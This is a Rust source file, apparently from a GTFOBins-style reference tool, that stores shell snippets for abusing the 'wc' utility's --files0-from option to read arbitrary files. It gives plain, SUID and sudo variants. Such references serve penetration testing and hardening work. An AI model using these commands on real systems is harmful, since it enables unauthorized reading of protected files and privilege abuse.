pub static BIN_NAME: &'static str = "wc";
pub static BIN_DESC: &'static str = r#"The file content is parsed as a sequence of `\x00` separated paths. On error the file content appears in a message, so this may not be suitable to read binary files."#;
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    wc --files0-from "$LFILE"
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which wc) .

    LFILE=file_to_read
    ./wc --files0-from "$LFILE"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo wc --files0-from "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
